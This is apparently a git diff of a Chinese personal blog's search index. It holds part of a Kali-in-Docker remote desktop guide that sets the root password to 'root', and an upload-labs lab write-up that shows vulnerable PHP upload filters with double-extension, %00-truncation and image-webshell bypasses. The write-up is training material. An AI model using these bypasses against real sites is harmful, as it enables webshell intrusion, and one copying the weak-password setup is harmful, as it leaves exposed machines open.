+<pre><code class="hljs routeros">apt-<span class="hljs-builtin-name">get</span> update
+
+apt-<span class="hljs-builtin-name">get</span> -y install kali-desktop-xfce xorg xrdp</code></pre>
+
+<p>配置xrdp实现远程连接图形界面：</p>
+<pre><code class="hljs 1c">sed -i &#x27;s/port=<span class="hljs-number">3399</span>/port=<span class="hljs-number">3389</span>/g&#x27; /etc/xrdp/xrdp.ini
+service xrdp restart</code></pre>
+
+<p>修改root用户密码：</p>
+<pre><code class="hljs vim">passwd root
+
+
+<span class="hljs-keyword">echo</span> roo<span class="hljs-variable">t:root</span>|chpasswd</code></pre>
+
+<p>再次登录XRDP：</p>
+<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220304155750507.png" alt="image-20220304155750507"></p>
+<h3 id="打包镜像"><a href="#打包镜像" class="headerlink" title="打包镜像"></a>打包镜像</h3><pre><code class="hljs applescript">docker commit <span class="hljs-built_in">id</span> docker-attack</code></pre>
+
+<h2 id="编写Dockerfile"><a href="#编写Dockerfile" class="headerlink" title="编写Dockerfile"></a>编写Dockerfile</h2><p>因为启动容器后需要运行</p>
+<pre><code class="hljs 1c">sed -i &#x27;s/port=<span class="hljs-number">3399</span>/port=<span class="hljs-number">3389</span>/g&#x27; /etc/xrdp/xrdp.ini
+service xrdp restart</code></pre>
+
+<p>所有使用Dockerfile完成这两步操作</p>
+<pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span> kali-attack:latest
+<span class="hljs-keyword">COPY</span><span class="bash"> run.sh /home/run.sh</span>
+<span class="hljs-keyword">RUN</span><span class="bash"> chmod +x /home/run.sh</span>
+<span class="hljs-keyword">CMD</span><span class="bash"> [<span class="hljs-string">&quot;/bin/bash&quot;</span>,<span class="hljs-string">&quot;-c&quot;</span>,<span class="hljs-string">&quot;/home/run.sh &amp;&amp; tail -f /dev/null&quot;</span>]</span></code></pre>
+
+<p> 没有<code>tail -f /dev/null</code>会导致启动容器后自动退出无法使用，<a href="https://yeasy.gitbook.io/docker_practice/image/dockerfile/cmd">原因</a>可能如下</p>
+<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220305103247695.png" alt="image-20220305103247695"></p>
+<p><code>run.sh</code>中的内容，为启动容器后需要执行的两条命令</p>
+<pre><code class="hljs sh"><span class="hljs-meta">#!/bin/bash</span>
+
+sed -i <span class="hljs-string">&#x27;s/port=3399/port=3389/g&#x27;</span> /etc/xrdp/xrdp.ini
+<span class="hljs-built_in">wait</span>
+service xrdp restart</code></pre>
+
+<p>使用</p>
+<pre><code class="hljs apache"><span class="hljs-attribute">docker</span> build -t kali-attack<span class="hljs-number">2</span> .</code></pre>
+
+<p>创建镜像，之后创建容器</p>
+<pre><code class="hljs apache"><span class="hljs-attribute">docker</span> run -itd -p <span class="hljs-number">3399</span>:<span class="hljs-number">3389</span> kali-attack<span class="hljs-number">2</span></code></pre>
+
+<p>这样就可以直接使用mstvc.exe连接kali桌面</p>
+<pre><code class="hljs avrasm"><span class="hljs-symbol">username:</span>root
+<span class="hljs-symbol">password:</span>root</code></pre>
+
+
+
+<h1 id="docker访问宿主机网络资源"><a href="#docker访问宿主机网络资源" class="headerlink" title="docker访问宿主机网络资源"></a>docker访问宿主机网络资源</h1><p><a href="https://swiftflamel.com/2021/04/01/docker-container%E5%AE%B9%E5%99%A8%E5%86%85%E8%AE%BF%E9%97%AE%E5%AE%BF%E4%B8%BB%E6%9C%BAhost%E6%9C%8D%E5%8A%A1/">解决方案</a></p>
+<p>本文使用的的windows docker版本大于18.03可以直接使用<code>host.docker.internal</code>访问宿主机网络资源</p>
+<p>其他操作系统的可以<a href="https://www.jianshu.com/p/4a358a120983">参考</a></p>
+<h1 id="docker容器安装vim出错"><a href="#docker容器安装vim出错" class="headerlink" title="docker容器安装vim出错"></a>docker容器安装vim出错</h1><p>报错信息如下</p>
+<pre><code class="hljs apache"><span class="hljs-attribute">ncurses</span>-base : Breaks: libtinfo<span class="hljs-number">5</span> (&lt; <span class="hljs-number">6</span>.<span class="hljs-number">1</span>) but <span class="hljs-number">6</span>.<span class="hljs-number">0</span>+<span class="hljs-number">20161126</span>-<span class="hljs-number">1</span>+deb<span class="hljs-number">9</span>u<span class="hljs-number">2</span> is to be installed
+<span class="hljs-attribute">E</span>: Error, pkgProblemResolver::Resolve generated breaks, this may be caused by held packages.
+<span class="hljs-attribute">E</span>: Unable to correct dependencies</code></pre>
+
+<p>直接使用apt安装此包即可</p>
+<pre><code class="hljs vim">apt <span class="hljs-keyword">update</span>
+apt upgrade
+apt install <span class="hljs-keyword">vim</span></code></pre>
+
+]]></content>
+      <categories>
+        <category>python</category>
+      </categories>
+      <tags>
+        <tag>docker</tag>
       </tags>
   </entry>
   <entry>
@@ -2995,20 +2996,6 @@ save</code></pre>
       </tags>
   </entry>
   <entry>
-    <title>reggie</title>
-    <url>/2022/04/29/reggie/</url>
-    <content><![CDATA[<h1 id="瑞吉外卖项目"><a href="#瑞吉外卖项目" class="headerlink" title="瑞吉外卖项目"></a>瑞吉外卖项目</h1><p>黑马程序员最新的springboot课程中的项目</p>
-<p>项目地址为 <a href="https://github.com/sunzhengyu99/reggie">瑞吉</a></p>
-<p>代码全是跟着视频敲出来的，后面会对项目进行优化。</p>
-]]></content>
-      <categories>
-        <category>java</category>
-      </categories>
-      <tags>
-        <tag>springboot</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>scrapy</title>
     <url>/2021/03/31/scrapy/</url>
     <content><![CDATA[<h1 id="学习分布式爬虫第一天"><a href="#学习分布式爬虫第一天" class="headerlink" title="学习分布式爬虫第一天"></a>学习分布式爬虫第一天</h1><h2 id="xpath编写"><a href="#xpath编写" class="headerlink" title="xpath编写"></a>xpath编写</h2><p>xpath学习，谷歌商店下载<code>xpath helper</code>，可以大大提高效率</p>
@@ -3548,6 +3535,20 @@ ITEM_PIPELINES = &#123;
 ]]></content>
   </entry>
   <entry>
+    <title>reggie</title>
+    <url>/2022/04/29/reggie/</url>
+    <content><![CDATA[<h1 id="瑞吉外卖项目"><a href="#瑞吉外卖项目" class="headerlink" title="瑞吉外卖项目"></a>瑞吉外卖项目</h1><p>黑马程序员最新的springboot课程中的项目</p>
+<p>项目地址为 <a href="https://github.com/sunzhengyu99/reggie">瑞吉</a></p>
+<p>代码全是跟着视频敲出来的，后面会对项目进行优化。</p>
+]]></content>
+      <categories>
+        <category>java</category>
+      </categories>
+      <tags>
+        <tag>springboot</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>sqlmap</title>
     <url>/2020/07/18/sql%E6%B3%A8%E5%85%A5/</url>
     <content><![CDATA[<h1 id="sqlmap使用"><a href="#sqlmap使用" class="headerlink" title="sqlmap使用"></a>sqlmap使用</h1><span id="more"></span>
@@ -3574,6 +3575,103 @@ ITEM_PIPELINES = &#123;
       </categories>
       <tags>
         <tag>sql</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>upload-11-21</title>
+    <url>/2020/09/18/upload2/</url>
+    <content><![CDATA[<h1 id="upload-labs-11-21"><a href="#upload-labs-11-21" class="headerlink" title="upload-labs 11-21"></a>upload-labs 11-21</h1><span id="more"></span>
+
+<h2 id="pass11"><a href="#pass11" class="headerlink" title="pass11"></a>pass11</h2><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;
+<span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;
+<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;
+    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;
+        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;php&quot;</span>,<span class="hljs-string">&quot;php5&quot;</span>,<span class="hljs-string">&quot;php4&quot;</span>,<span class="hljs-string">&quot;php3&quot;</span>,<span class="hljs-string">&quot;php2&quot;</span>,<span class="hljs-string">&quot;html&quot;</span>,<span class="hljs-string">&quot;htm&quot;</span>,<span class="hljs-string">&quot;phtml&quot;</span>,<span class="hljs-string">&quot;pht&quot;</span>,<span class="hljs-string">&quot;jsp&quot;</span>,<span class="hljs-string">&quot;jspa&quot;</span>,<span class="hljs-string">&quot;jspx&quot;</span>,<span class="hljs-string">&quot;jsw&quot;</span>,<span class="hljs-string">&quot;jsv&quot;</span>,<span class="hljs-string">&quot;jspf&quot;</span>,<span class="hljs-string">&quot;jtml&quot;</span>,<span class="hljs-string">&quot;asp&quot;</span>,<span class="hljs-string">&quot;aspx&quot;</span>,<span class="hljs-string">&quot;asa&quot;</span>,<span class="hljs-string">&quot;asax&quot;</span>,<span class="hljs-string">&quot;ascx&quot;</span>,<span class="hljs-string">&quot;ashx&quot;</span>,<span class="hljs-string">&quot;asmx&quot;</span>,<span class="hljs-string">&quot;cer&quot;</span>,<span class="hljs-string">&quot;swf&quot;</span>,<span class="hljs-string">&quot;htaccess&quot;</span>,<span class="hljs-string">&quot;ini&quot;</span>);
+
+        <span class="hljs-variable">$file_name</span> = trim(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);
+        <span class="hljs-variable">$file_name</span> = str_ireplace(<span class="hljs-variable">$deny_ext</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$file_name</span>);
+        <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];
+        <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$file_name</span>;        
+        <span class="hljs-keyword">if</span> (move_uploaded_file(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;
+            <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;
+        &#125; <span class="hljs-keyword">else</span> &#123;
+            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;
+        &#125;
+    &#125; <span class="hljs-keyword">else</span> &#123;
+        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;
+    &#125;
+&#125;</code></pre>
+
+
+<p> <code>$file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name);</code></p>
+<p>这段代码是将文件名中出现  <code>deny_ext</code>的后缀名替换为空</p>
+<p>可以双写绕过，即<code>1.pphphp</code></p>
+<h2 id="pass12"><a href="#pass12" class="headerlink" title="pass12"></a>pass12</h2><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;
+<span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;
+<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]))&#123;
+    <span class="hljs-variable">$ext_arr</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;jpg&#x27;</span>,<span class="hljs-string">&#x27;png&#x27;</span>,<span class="hljs-string">&#x27;gif&#x27;</span>);
+    <span class="hljs-variable">$file_ext</span> = substr(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>],strrpos(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>],<span class="hljs-string">&quot;.&quot;</span>)+<span class="hljs-number">1</span>);
+    <span class="hljs-keyword">if</span>(in_array(<span class="hljs-variable">$file_ext</span>,<span class="hljs-variable">$ext_arr</span>))&#123;
+        <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];
+        <span class="hljs-variable">$img_path</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;save_path&#x27;</span>].<span class="hljs-string">&quot;/&quot;</span>.rand(<span class="hljs-number">10</span>, <span class="hljs-number">99</span>).date(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-string">&quot;.&quot;</span>.<span class="hljs-variable">$file_ext</span>;
+
+        <span class="hljs-keyword">if</span>(move_uploaded_file(<span class="hljs-variable">$temp_file</span>,<span class="hljs-variable">$img_path</span>))&#123;
+            <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;
+        &#125; <span class="hljs-keyword">else</span> &#123;
+            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;
+        &#125;
+    &#125; <span class="hljs-keyword">else</span>&#123;
+        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;
+    &#125;
+&#125;</code></pre>
+
+<p>本题与之前的题目有所不同，这题的文件的保存路径是可以控制的</p>
+<p>这里用的<code>%00截断</code>，原理如下</p>
+<p><code>www.xxx.com/qq.jpg</code></p>
+<p><code>www.xxx.com/qq.php%00.jpg =&gt; www.xxx.com/qq.php</code>其后缀名为.jpg可以绕过检测，但是windows系统处理时不会处理%00之后的内容故保存的文件就是qq.php</p>
+<p><img src="https://i.loli.net/2020/11/30/TwSKHkqZFC78uRd.png" alt></p>
+<h2 id="pass13"><a href="#pass13" class="headerlink" title="pass13"></a>pass13</h2><p>这题与上题利用的原理相同</p>
+<p>但是这里要使用 00的二进制形式</p>
+<p><img src="/2020/09/18/upload2/13.png" alt></p>
+<p><img src="/2020/09/18/upload2/13-1.png" alt></p>
+<h2 id="pass14"><a href="#pass14" class="headerlink" title="pass14"></a>pass14</h2><p>明确说了上传图片木马</p>
+<pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getReailFileType</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span></span>)</span>&#123;
+    <span class="hljs-variable">$file</span> = fopen(<span class="hljs-variable">$filename</span>, <span class="hljs-string">&quot;rb&quot;</span>);
+    <span class="hljs-variable">$bin</span> = fread(<span class="hljs-variable">$file</span>, <span class="hljs-number">2</span>); <span class="hljs-comment">//只读2字节</span>
+    fclose(<span class="hljs-variable">$file</span>);
+    <span class="hljs-variable">$strInfo</span> = @unpack(<span class="hljs-string">&quot;C2chars&quot;</span>, <span class="hljs-variable">$bin</span>);    
+    <span class="hljs-variable">$typeCode</span> = intval(<span class="hljs-variable">$strInfo</span>[<span class="hljs-string">&#x27;chars1&#x27;</span>].<span class="hljs-variable">$strInfo</span>[<span class="hljs-string">&#x27;chars2&#x27;</span>]);    
+    <span class="hljs-variable">$fileType</span> = <span class="hljs-string">&#x27;&#x27;</span>;    
+    <span class="hljs-keyword">switch</span>(<span class="hljs-variable">$typeCode</span>)&#123;      
+        <span class="hljs-keyword">case</span> <span class="hljs-number">255216</span>:            
+            <span class="hljs-variable">$fileType</span> = <span class="hljs-string">&#x27;jpg&#x27;</span>;
+            <span class="hljs-keyword">break</span>;
+        <span class="hljs-keyword">case</span> <span class="hljs-number">13780</span>:            
+            <span class="hljs-variable">$fileType</span> = <span class="hljs-string">&#x27;png&#x27;</span>;
+            <span class="hljs-keyword">break</span>;        
+        <span class="hljs-keyword">case</span> <span class="hljs-number">7173</span>:            
+            <span class="hljs-variable">$fileType</span> = <span class="hljs-string">&#x27;gif&#x27;</span>;
+            <span class="hljs-keyword">break</span>;
+        <span class="hljs-keyword">default</span>:            
+            <span class="hljs-variable">$fileType</span> = <span class="hljs-string">&#x27;unknown&#x27;</span>;
+        &#125;    
+        <span class="hljs-keyword">return</span> <span class="hljs-variable">$fileType</span>;
+&#125;</code></pre>
+
+<p><strong>GIF89a</strong> 是GIF图片的文件头 ，是为了绕过gif文件的检查</p>
+<p><strong>图片木马的制作</strong></p>
+<p>桌面建立一个文本文件将其改为2.jpg，再建立一个改为1.php,其内容为你想添加的一句话木马</p>
+<p><img src="https://i.loli.net/2020/11/30/vXmVIJ3OEzcnrsL.png" alt></p>
+<p><code>copy 2.jpg /b + 1.php /a webshell.jpg</code></p>
+<p><img src="https://i.loli.net/2020/11/30/KWgpdyf8xoFqcMn.png" alt></p>
+<p><strong>未完待续。。。</strong></p>
+]]></content>
+      <categories>
+        <category>文件上传</category>
+      </categories>
+      <tags>
+        <tag>双写绕过</tag>
+        <tag>00截断</tag>
       </tags>
   </entry>
   <entry>
@@ -3827,103 +3925,6 @@ video/mp4
         <tag>大小写绕过</tag>
         <tag>.htaccess</tag>
         <tag>windows文件特性</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>upload-11-21</title>
-    <url>/2020/09/18/upload2/</url>
-    <content><![CDATA[<h1 id="upload-labs-11-21"><a href="#upload-labs-11-21" class="headerlink" title="upload-labs 11-21"></a>upload-labs 11-21</h1><span id="more"></span>
-
-<h2 id="pass11"><a href="#pass11" class="headerlink" title="pass11"></a>pass11</h2><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;
-<span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;
-<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;
-    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;
-        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;php&quot;</span>,<span class="hljs-string">&quot;php5&quot;</span>,<span class="hljs-string">&quot;php4&quot;</span>,<span class="hljs-string">&quot;php3&quot;</span>,<span class="hljs-string">&quot;php2&quot;</span>,<span class="hljs-string">&quot;html&quot;</span>,<span class="hljs-string">&quot;htm&quot;</span>,<span class="hljs-string">&quot;phtml&quot;</span>,<span class="hljs-string">&quot;pht&quot;</span>,<span class="hljs-string">&quot;jsp&quot;</span>,<span class="hljs-string">&quot;jspa&quot;</span>,<span class="hljs-string">&quot;jspx&quot;</span>,<span class="hljs-string">&quot;jsw&quot;</span>,<span class="hljs-string">&quot;jsv&quot;</span>,<span class="hljs-string">&quot;jspf&quot;</span>,<span class="hljs-string">&quot;jtml&quot;</span>,<span class="hljs-string">&quot;asp&quot;</span>,<span class="hljs-string">&quot;aspx&quot;</span>,<span class="hljs-string">&quot;asa&quot;</span>,<span class="hljs-string">&quot;asax&quot;</span>,<span class="hljs-string">&quot;ascx&quot;</span>,<span class="hljs-string">&quot;ashx&quot;</span>,<span class="hljs-string">&quot;asmx&quot;</span>,<span class="hljs-string">&quot;cer&quot;</span>,<span class="hljs-string">&quot;swf&quot;</span>,<span class="hljs-string">&quot;htaccess&quot;</span>,<span class="hljs-string">&quot;ini&quot;</span>);
-
-        <span class="hljs-variable">$file_name</span> = trim(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);
-        <span class="hljs-variable">$file_name</span> = str_ireplace(<span class="hljs-variable">$deny_ext</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$file_name</span>);
-        <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];
-        <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$file_name</span>;        
-        <span class="hljs-keyword">if</span> (move_uploaded_file(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;
-            <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;
-        &#125; <span class="hljs-keyword">else</span> &#123;
-            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;
-        &#125;
-    &#125; <span class="hljs-keyword">else</span> &#123;
-        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;
-    &#125;
-&#125;</code></pre>
-
-
-<p> <code>$file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name);</code></p>
-<p>这段代码是将文件名中出现  <code>deny_ext</code>的后缀名替换为空</p>
-<p>可以双写绕过，即<code>1.pphphp</code></p>
-<h2 id="pass12"><a href="#pass12" class="headerlink" title="pass12"></a>pass12</h2><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;
-<span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;
-<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]))&#123;
-    <span class="hljs-variable">$ext_arr</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;jpg&#x27;</span>,<span class="hljs-string">&#x27;png&#x27;</span>,<span class="hljs-string">&#x27;gif&#x27;</span>);
-    <span class="hljs-variable">$file_ext</span> = substr(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>],strrpos(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>],<span class="hljs-string">&quot;.&quot;</span>)+<span class="hljs-number">1</span>);
-    <span class="hljs-keyword">if</span>(in_array(<span class="hljs-variable">$file_ext</span>,<span class="hljs-variable">$ext_arr</span>))&#123;
-        <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];
-        <span class="hljs-variable">$img_path</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;save_path&#x27;</span>].<span class="hljs-string">&quot;/&quot;</span>.rand(<span class="hljs-number">10</span>, <span class="hljs-number">99</span>).date(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-string">&quot;.&quot;</span>.<span class="hljs-variable">$file_ext</span>;
-
-        <span class="hljs-keyword">if</span>(move_uploaded_file(<span class="hljs-variable">$temp_file</span>,<span class="hljs-variable">$img_path</span>))&#123;
-            <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;
-        &#125; <span class="hljs-keyword">else</span> &#123;
-            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;
-        &#125;
-    &#125; <span class="hljs-keyword">else</span>&#123;
-        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;
-    &#125;
-&#125;</code></pre>
-
-<p>本题与之前的题目有所不同，这题的文件的保存路径是可以控制的</p>
-<p>这里用的<code>%00截断</code>，原理如下</p>
-<p><code>www.xxx.com/qq.jpg</code></p>
-<p><code>www.xxx.com/qq.php%00.jpg =&gt; www.xxx.com/qq.php</code>其后缀名为.jpg可以绕过检测，但是windows系统处理时不会处理%00之后的内容故保存的文件就是qq.php</p>
-<p><img src="https://i.loli.net/2020/11/30/TwSKHkqZFC78uRd.png" alt></p>
-<h2 id="pass13"><a href="#pass13" class="headerlink" title="pass13"></a>pass13</h2><p>这题与上题利用的原理相同</p>
-<p>但是这里要使用 00的二进制形式</p>
-<p><img src="/2020/09/18/upload2/13.png" alt></p>
-<p><img src="/2020/09/18/upload2/13-1.png" alt></p>
-<h2 id="pass14"><a href="#pass14" class="headerlink" title="pass14"></a>pass14</h2><p>明确说了上传图片木马</p>
-<pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getReailFileType</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span></span>)</span>&#123;
-    <span class="hljs-variable">$file</span> = fopen(<span class="hljs-variable">$filename</span>, <span class="hljs-string">&quot;rb&quot;</span>);
-    <span class="hljs-variable">$bin</span> = fread(<span class="hljs-variable">$file</span>, <span class="hljs-number">2</span>); <span class="hljs-comment">//只读2字节</span>
-    fclose(<span class="hljs-variable">$file</span>);
-    <span class="hljs-variable">$strInfo</span> = @unpack(<span class="hljs-string">&quot;C2chars&quot;</span>, <span class="hljs-variable">$bin</span>);    
-    <span class="hljs-variable">$typeCode</span> = intval(<span class="hljs-variable">$strInfo</span>[<span class="hljs-string">&#x27;chars1&#x27;</span>].<span class="hljs-variable">$strInfo</span>[<span class="hljs-string">&#x27;chars2&#x27;</span>]);    
-    <span class="hljs-variable">$fileType</span> = <span class="hljs-string">&#x27;&#x27;</span>;    
-    <span class="hljs-keyword">switch</span>(<span class="hljs-variable">$typeCode</span>)&#123;      
-        <span class="hljs-keyword">case</span> <span class="hljs-number">255216</span>:            
-            <span class="hljs-variable">$fileType</span> = <span class="hljs-string">&#x27;jpg&#x27;</span>;
-            <span class="hljs-keyword">break</span>;
-        <span class="hljs-keyword">case</span> <span class="hljs-number">13780</span>:            
-            <span class="hljs-variable">$fileType</span> = <span class="hljs-string">&#x27;png&#x27;</span>;
-            <span class="hljs-keyword">break</span>;        
-        <span class="hljs-keyword">case</span> <span class="hljs-number">7173</span>:            
-            <span class="hljs-variable">$fileType</span> = <span class="hljs-string">&#x27;gif&#x27;</span>;
-            <span class="hljs-keyword">break</span>;
-        <span class="hljs-keyword">default</span>:            
-            <span class="hljs-variable">$fileType</span> = <span class="hljs-string">&#x27;unknown&#x27;</span>;
-        &#125;    
-        <span class="hljs-keyword">return</span> <span class="hljs-variable">$fileType</span>;
-&#125;</code></pre>
-
-<p><strong>GIF89a</strong> 是GIF图片的文件头 ，是为了绕过gif文件的检查</p>
-<p><strong>图片木马的制作</strong></p>
-<p>桌面建立一个文本文件将其改为2.jpg，再建立一个改为1.php,其内容为你想添加的一句话木马</p>
-<p><img src="https://i.loli.net/2020/11/30/vXmVIJ3OEzcnrsL.png" alt></p>
-<p><code>copy 2.jpg /b + 1.php /a webshell.jpg</code></p>
-<p><img src="https://i.loli.net/2020/11/30/KWgpdyf8xoFqcMn.png" alt></p>
-<p><strong>未完待续。。。</strong></p>
-]]></content>
-      <categories>
-        <category>文件上传</category>
-      </categories>
-      <tags>
-        <tag>双写绕过</tag>
-        <tag>00截断</tag>
       </tags>
   </entry>
   <entry>
@@ -4817,56 +4818,6 @@ cmd=<span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;ca
       </tags>
   </entry>
   <entry>
-    <title>爬图</title>
-    <url>/2020/07/18/%E7%88%AC%E5%9B%BE/</url>
-    <content><![CDATA[<h1 id="用爬虫爬取小姐姐的图片"><a href="#用爬虫爬取小姐姐的图片" class="headerlink" title="用爬虫爬取小姐姐的图片"></a>用爬虫爬取小姐姐的图片</h1><span id="more"></span>
-<p><strong>用的库</strong></p>
-<pre><code class="hljs applescript">re <span class="hljs-comment">#正则表达式</span>
-requests <span class="hljs-comment">#url请求</span>
-<span class="hljs-built_in">time</span>   <span class="hljs-comment">#时间</span>
-os     <span class="hljs-comment">#用于创建文件夹，保存图片</span></code></pre>
-<p>##准备工作<br>1.首先访问该链接<br><code>https://www.vmgirls.com/</code><br>2.随便点击一个进入查看详情<br><code>https://www.vmgirls.com/13344.html</code><br>3.F12审查元素网查看页详情，主要查看图片链接的标签位置，写出正则表达式<br><img src="https://i.loli.net/2020/12/04/49X1BbloChqFsic.png" alt="1"><br>该正则表达式为<code>findlinks = &#39;&lt;a href=&quot;(.*?)&quot; alt=&quot;.*?&quot; title=&quot;.*?&quot;&gt;&#39;</code></p>
-<h2 id="完整程序"><a href="#完整程序" class="headerlink" title="完整程序"></a>完整程序</h2><pre><code class="hljs python"><span class="hljs-comment"># -*- coding = utf - 8 -*-</span>
-<span class="hljs-comment">#@Time : 2020/7/16 13:36</span>
-<span class="hljs-comment">#@Author : sunzy</span>
-<span class="hljs-comment">#@File : tupian.py</span>
-<span class="hljs-keyword">import</span> re
-<span class="hljs-keyword">import</span> requests
-<span class="hljs-keyword">import</span> time
-<span class="hljs-keyword">import</span> os
-
-<span class="hljs-built_in">dir</span> = <span class="hljs-string">&quot;plmm&quot;</span>        <span class="hljs-comment">#文件夹名字</span>
-<span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(<span class="hljs-built_in">dir</span>):   <span class="hljs-comment">#首先判断是否存在当前文件夹如果没有则创建一个</span>
-    os.mkdir(<span class="hljs-built_in">dir</span>)
-<span class="hljs-comment"># 模仿浏览器的首部信息，绕过一些网站的反爬取措施</span>
-head = &#123;
-        <span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36 Edg/83.0.478.61&quot;</span>
-    &#125;
-
-url = <span class="hljs-string">&quot;https://www.vmgirls.com/13344.html&quot;</span>
-response = requests.get(url, headers = head)   <span class="hljs-comment"># 访问目标网页，获取网页内容</span>
-html = response.text
-
-findlinks = <span class="hljs-string">&#x27;&lt;a href=&quot;(.*?)&quot; alt=&quot;.*?&quot; title=&quot;.*?&quot;&gt;&#x27;</span>
-urls = re.findall(findlinks, html)   <span class="hljs-comment">#爬取到的图片链接保存在urls中， 是一个列表</span>
-
-<span class="hljs-keyword">for</span> url <span class="hljs-keyword">in</span> urls:
-    time.sleep(<span class="hljs-number">1</span>)    <span class="hljs-comment">#防止访问速度过快使服务器崩溃</span>
